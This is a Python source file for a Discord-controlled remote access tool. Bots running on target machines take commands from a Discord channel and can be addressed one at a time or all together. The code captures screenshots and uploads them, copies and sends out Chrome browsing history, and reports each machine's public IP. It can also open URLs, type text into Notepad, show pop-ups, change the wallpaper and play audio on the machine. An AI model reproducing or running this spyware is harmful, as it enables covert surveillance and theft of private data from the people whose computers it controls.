import subprocess
import sys
import os
import time
import webbrowser
import discord
from discord.ext import commands 
import pyautogui
import platform
import tkinter as tk
from tkinter import messagebox
import pygetwindow as gw
import ctypes
from playsound3 import playsound
import sqlite3
import requests
import shutil


#Variables and stuff
strid = ""

script_dir = os.path.dirname(os.path.abspath(__file__))

scrnm = 'Screenshot.png'

scrdir = os.path.join(script_dir, scrnm)

history_path = os.path.expanduser('~') + '/Library/Application Support/Google/Chrome/Default/History'

hisout = 'history.txt'

hos = "hiscopy"

hoscopy = os.path.join(script_dir, hos)

historyoutput = os.path.join(script_dir, hisout)

app_data = os.getenv('LOCALAPPDATA')

SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDCHANGE = 0x02

#Debug code
print("START")

#Token and channel id
Token = ""  #Insert discord bot token
chnid = 0   #channel id

#Get identifcation for direct commands
try:
    user = os.getlogin()
except OSError:
    # Handle the case where os.getlogin() doesn't work
    user = os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown'
strid = user

#Intents
intents = discord.Intents.all() #To lazy to do each one

bot = commands.Bot(command_prefix="!", intents = discord.Intents.all())

#Command functions
def writefunct(name, text):
    if name == strid:
        subprocess.Popen("C:\\Windows\\System32\\notepad.exe")
        
        time.sleep(2)
        
        windows = gw.getWindowsWithTitle("Untitled - Notepad")
        if windows:
            notepad = windows[0]
            notepad.activate()  # Bring Notepad to the foreground
        else:
            returnvar = "Failed to find Notepad window"
            return returnvar
        if text != None:
            print(text)    
            pyautogui.write(f"{text}", interval=0.05)  #pyauotgui kinda sucks so if text gets skips im not fixing it
        else:
            pyautogui.write("Crazy? I was crazy once. They put me in a room. A rubber room. A rubber room with rats. They put me in a rubber room with rubber rats. Rubber rats? I hate rubber rats. They make me crazy.", interval=0.05)  #Replace with desired text, this interval best worked for me
        returnvar = f'dirwrite: {strid}'
        return returnvar
    elif name == "all":
        subprocess.Popen("C:\\Windows\\System32\\notepad.exe")
        
        time.sleep(2)
        
        windows = gw.getWindowsWithTitle("Untitled - Notepad")
        if windows:
            notepad = windows[0]
            notepad.activate()  # Bring Notepad to the foreground
        else:
            returnvar = "Failed to find Notepad window"
            return returnvar

        if text != None:
            print(text)
            pyautogui.write(text, interval=0.05)  #pyauotgui kinda sucks so if text gets skips im not fixing it 
        else:
            pyautogui.write("Crazy? I was crazy once. They put me in a room. A rubber room. A rubber room with rats. They put me in a rubber room with rubber rats. Rubber rats? I hate rubber rats. They make me crazy.", interval=0.05)  #Replace with desired text, this interval best worked for me
        returnvar = f'write: {strid}'
        return returnvar
    else:
        returnvar = ""
        return returnvar
    
def urlfunct(name, url): #self explanitory
    if name == strid:
        webbrowser.open(url)
        return f'dirurlopen: {strid}!'
    elif name == "all":
        webbrowser.open(url)
        return f"urlopen: {strid}"
    else:
        return ""

def promptfunct(name, text):
    if name == strid:
        root = tk.Tk()
        root.withdraw()  # Hide the root window
    
    
        # Display a message box
        messagebox.showinfo("Important message", f"{text}")

        return f"dirprompt: {strid}; {text}"

    elif name == "all":
        root = tk.Tk()
        root.withdraw()  # Hide the root window
    
    
        # Display a message box
        messagebox.showinfo("Important message", f"{text}")

        return f"prompt: {strid}; {text}"

    else:
        return ""


def wallfunct(imagepth, name, perm):
    perm = perm
    if not os.path.isfile(imagepth):
        print(f"File not found: {imagepth}")
        return
    
    absimagepath = os.path.abspath(imagepth)
    print(absimagepath)

    if name == strid:
        if perm == 'perm':
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absimagepath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
            imvar = f"dirwallchn: {strid}, Permenant"                           
        else:
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absimagepath, SPIF_SENDCHANGE)
            imvar = f"dirwallchn: {strid}"
        return imvar
    elif name == "all": 
        if perm == 'perm':
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absimagepath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE)
            imvar = f"wallchn: {strid}, Permenant"                           
        else:
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, absimagepath, SPIF_SENDCHANGE)
            imvar = f"wallchn: {strid}"
        return imvar
    else:                                      
        print("0")
    

def historyfunct():
    if app_data:
    #Construct the path to the Chrome history file
        history_path = os.path.join(app_data, 'Google', 'Chrome', 'User Data', 'Default', 'History')

    if not os.path.exists(historyoutput):
        with open(historyoutput, 'w') as file:
            file.write("History\n")

    #Connect to the database
    shutil.copy(history_path, hoscopy)
    
    conn = sqlite3.connect(hoscopy)
    cursor = conn.cursor()

    #Query to get the browsing history
    query = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 50"
    cursor.execute(query)

    #Fetch and format the results
    results = cursor.fetchall()

    with open(historyoutput, 'w', encoding='utf-8') as file:
        file.write(f"--- History Dump at {time.strftime('%Y-%m-%d %H:%M:%S')} ---\n")
        for row in results:
            file.write(f"URL: {row[0]}\nTitle: {row[1]}\nLast Visit Time: {row[2]}\n\n")
        file.write("\n")
    conn.close()
    os.remove(hoscopy)

    
def openimgfunc(file_path):
    if os.path.exists(file_path):
        print(f'File exists: {file_path}')
    else:
        print(f'File does not exist: {file_path}')

    if platform.system() == "Windows":  #open using os' image opening application
        os.startfile(file_path)
    elif platform.system() == "Darwin":
        subprocess.call(["open", file_path])
    else:
        subprocess.call(["xdg-open", file_path])

def delimgfunc(file_path):
    time.sleep(10)      #wait before delete so image can load even if device is slow

    #Delete the file
    os.remove(file_path)

    time.sleep(5)

    if os.path.exists(file_path): #debug: wait and check if like image is deleted
        print(f'File exists: {file_path}')
    else:
        print(f'File does not exist: {file_path}')


#Initalize command.  Example: !test

@bot.event #When bot connects to server
async def on_ready():
    print("Running")                                    #Debug
    channel = bot.get_channel(chnid)                    #Get the specifed channel
    await channel.send(f"Operating: {strid}")           #Send message to server


@bot.command(name='stop')#To close specified online bots
async def stop(ctx, *, name: str = None):
    if name == strid:   #Send command to only directed bot
        await ctx.send(f"Shuting down: {strid}")
        sys.exit()
    elif name == "all": #Send command to all online bots
        await ctx.send(f"Shuting down: {strid}")
        sys.exit()
    else:               #Returns invalid in case you actualy want to shut down but miss type
        await ctx.send("invalid shut down")
        print("0")


@bot.command(name='test')#Test if bot can receive
async def test(ctx, *, name: str = None):
    if name == strid:                           #Sends message "dirrecive" with id to verify direct receive function works
        await ctx.send(f'dirrecive 21: {strid}')
    elif name == "all":                         #Sends message "recive" with id to verify receive all function works
        await ctx.send(f"recived 21: {strid}")
    else:                                       #Does nothing because target destination is mispelled or not the directed bot
        print("0")


@bot.command(name='screen')
async def screen(ctx, *, name: str = None):
    if name == strid:                   #Send to only specified id
        pyautogui.screenshot(scrdir) #take screenshot
        await ctx.send(content=f"dirscreen:{strid}", file=discord.File(scrdir)) #send screenshot      
        try:
            # Delete the file
            os.remove(scrdir)
        except Exception as e:
                print("ohno") 

    elif name == "all":                   #Send to all
        pyautogui.screenshot(scrdir) #take screenshot
        await ctx.send(content=f"screen:{strid}", file=discord.File(scrdir)) #send screenshot      
        try:
            # Delete the file
            os.remove(scrdir)
        except Exception as e:
                print("ohno") 
    else:
        print("0")


@bot.command(name='write')#Check function for details
async def write(ctx, name: str = None, *, text: str = None):
    wrtvar = writefunct(name, text)
    if wrtvar == "":
        print(0)
    else:
        await ctx.send(wrtvar)


@bot.command(name='rick')#Check function for details
async def rick(ctx, *, name: str = None):
    url = 'https://www.youtube.com/watch?v=p7YXXieghto'
    rvar = urlfunct(name, url)
    if rvar == "":
        print(0)
    else:
        await ctx.send(rvar)


@bot.command(name='altrick')#Check function for details
async def altrick(ctx, *, name: str = None):
    url = 'https://youtube.com/clip/Ugkx6oaIXZKt-QhGWyxiwjIUQdK--u3zN-JE?si=FGFWE2OV0m9utxLc'
    rvar = urlfunct(name, url)
    if rvar == "":
        print(0)
    else:
        await ctx.send(rvar)


@bot.command(name='sendurl')#Check function for details
async def sendurl(ctx, name: str = None, *, text: str = None):
    url = f'{text}'
    rvar = urlfunct(name, url)
    if rvar == "":
        print(0)
    else:
        await ctx.send(rvar)


@bot.command(name='openimg')
async def openimg(ctx, *, name: str = None):
    if name == strid:
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            file_name = attachment.filename  # Get the name of the file

            # Download the file
            try:
                file_path = os.path.join('.', file_name) 
                await attachment.save(file_path)
                # To optionally send the file back to the channel use this :await ctx.send(file=discord.File(file_path))
                openimgfunc(file_path)
                await ctx.send(f'diropenimg: {strid}')
                delimgfunc(file_path)

            except Exception as e:
                await ctx.send(f'Failed command: {e}')
        else:
            await ctx.send('No file attached')

    elif name == "all":
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            file_name = attachment.filename  # Get the name of the file

            # Download the file
            try:
                file_path = os.path.join('.', file_name) 
                await attachment.save(file_path)
                # To optionally send the file back to the channel use this :await ctx.send(file=discord.File(file_path))
                openimgfunc(file_path)
                await ctx.send(f'openimg: {strid}')
                delimgfunc(file_path)

            except Exception as e:
                await ctx.send(f'Failed command: {e}')
        else:
            await ctx.send('No file attached')
    else:
        print("0")

@bot.command(name='prompt')#Check function for details
async def prompt(ctx, name: str = None, *, text: str = None):
    promptvar = promptfunct(name, text)
    if promptvar == "":
        print(0)
    else:
        await ctx.send(promptvar)


@bot.command(name='wallpaper')#Check function for details
async def wallpaper(ctx, name: str = None, *, perm: str = None): 
    if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            imgpth = attachment.filename  # Get the name of the file
            try:
                file_path = os.path.join('.', imgpth) 
                await attachment.save(file_path)
                print(file_path)
                imvar = wallfunct(file_path, name, perm)
                if imvar == "":
                    print(0)
                else:
                    await ctx.send(imvar)
            except:
                await ctx.send(f'Failed to download the file')
            
    else:
        await ctx.send('No file atached')


@bot.command(name='audio')#Check function for details
async def audio(ctx, name: str = None, *, perm: str = None):
    if name == strid:            
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            print("atach")
            audpth = attachment.filename  # Get the name of the file
            print(audpth)
            audie = os.path.join('.', audpth)
            await attachment.save(audie)
            print("Playing")
            playsound(audie)
            await ctx.send(f'diraudio: {strid}')
        else:
            print(0)               

    elif name == "all":                         
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]  # Get the first attachment
            print("atach")
            audpth = attachment.filename  # Get the name of the file
            print(audpth)
            audie = os.path.join('.', audpth)
            await attachment.save(audie)
            print("Playing")
            playsound(audie)
            await ctx.send(f'diraudio: {strid}')
        else:
            print(0)               

    else:
        print(0)               
        

@bot.command(name='history')
async def history(ctx, *, name: str = None):
    if name == strid:
        historyfunct()                           
        await ctx.send(content=f'💀dirhistory💀:{strid}', file=discord.File(historyoutput))
        os.remove(historyoutput)
    elif name == "all":
        historyfunct()                         
        await ctx.send(content=f'💀history💀:{strid}', file=discord.File(historyoutput))
        os.remove(historyoutput)
    else:
        print("0")


@bot.command(name='grabip')
async def grabip(ctx, *, name: str = None):
    if name == strid:                           
        response = requests.get('https://api.ipify.org?format=json')
        publicip = response.json()['ip']

        print(f"Public IP Address: {publicip}")
        await ctx.send(content=f'💀dirgrabip💀{name}:{publicip}')
    elif name == "all":                         
        response = requests.get('https://api.ipify.org?format=json')
        publicip = response.json()['ip']

        print(f"Public IP Address: {publicip}")
        await ctx.send(content=f'💀grabip💀{name}:{publicip}')
    else:
        print("0")


@bot.command(name='extra')
async def extra(ctx, *, name: str = None):
    if name == strid:                           
        await ctx.send(f'dirrecive: {strid}')
    elif name == "all":                         
        await ctx.send(f"recived: {strid}")
    else:
        print("0")

bot.run(Token)
